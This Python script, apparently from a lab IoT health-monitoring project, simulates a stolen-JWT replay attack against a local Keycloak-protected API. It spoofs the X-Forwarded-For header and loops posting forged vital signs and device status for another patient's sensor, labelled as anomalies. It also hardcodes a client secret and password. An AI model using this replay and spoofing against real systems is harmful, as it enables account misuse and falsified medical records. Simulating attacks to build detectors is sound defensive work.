import requests
import random
import time
from datetime import datetime

KEYCLOAK_TOKEN_URL = "http://localhost:8080/realms/iot_realm/protocol/openid-connect/token"
API_SENSOR_URL = "https://localhost:8000/api/sensor"
API_SYSTEM_URL = "https://localhost:8000/api/system-status"
CERT_PATH = "../server/certs/cert.pem"
CLIENT_ID = "iot_backend"
CLIENT_SECRET = "q1nMXKR6EKwafhEcDkeugyvgmbhGpbSp"

def get_token(username, password="test123"):
    data = {
        "grant_type": "password",
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "username": username,
        "password": password
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        resp = requests.post(KEYCLOAK_TOKEN_URL, data=data, headers=headers, verify=CERT_PATH, timeout=10)
        if resp.status_code == 200:
            return resp.json()["access_token"]
        else:
            print(f"❌ Token error for {username}: {resp.text}")
            return None
    except Exception as e:
        print(f"❌ Connection error for {username}: {e}")
        return None

# 🔓 Token JWT volé (copié ou intercepté)
STOLEN_TOKEN = get_token("patient_040", "test123")

# Ajout du token volé dans les headers de la requête
headers = {
    "Authorization": f"Bearer {STOLEN_TOKEN}",
    "Content-Type": "application/json",
    "X-Forwarded-for":  "192.168.142.64" # Simule un appareil différent
}

def generate_sensor_data(device_id, anomaly=False, profile=None):
    base = profile

    data = {
        "device_id": device_id,
        "timestamp": datetime.now().isoformat(),
        "heart_rate": random.randint(0, 100),
        "spo2": round(random.uniform(95.0, 100.0), 1),
        "temperature": round(random.uniform(36.0, 38.5), 1),
        "systolic_bp": random.randint(110, 135),
        "diastolic_bp": random.randint(70, 90),
        "respiration_rate": random.randint(12, 20),
        "glucose_level": round(random.uniform(4.5, 7.0), 1),
        "ecg_summary": "Normal sinus rhythm",
        "label": 1
    }

    return data

def generate_system_data(device_id, username, anomaly=False):
    data = {
        "device_id": device_id,
        "username": username,
        "sensor_type": random.choice(["cardiosss", "thermiqzzue", "multiééééé"]),
        "ip_address": "192.168.142.64",
        "firmware_version": f"v{random.randint(1,3)}.{random.randint(0,9)}.{random.randint(0,9)}",
        "status": 1,  # Actif par défaut
        "data_frequency_seconds": random.randint(1000, 30000),
        "timestamp": datetime.now().isoformat(),
        "checksum_valid": True,
        "os_version": "issou 12",
        "update_required": False,
        "disk_free_percent": round(random.uniform(30.0, 80.0), 1)
    }

    return data


# Simulation de l'attaque : utilisation du même token pour envoyer des données sur un autre capteur
def simulate_capteur():

    while True:
        sensor_data = generate_sensor_data("raspi_050")
        system_data = generate_system_data("raspi_050", "patient_050")

        try:
            r1 = requests.post(API_SENSOR_URL, json=sensor_data, headers=headers, verify=CERT_PATH, timeout=5)
            r2 = requests.post(API_SYSTEM_URL, json=system_data, headers=headers, verify=CERT_PATH, timeout=5)

            print(f"[raspi_050] SENSOR MAL → {r1.status_code} | SYSTEM MAL → {r2.status_code}")

        except Exception as e:
            print(f"❌ Network error for raspi_050: {e}")

        time.sleep(random.randint(10, 30))

simulate_capteur()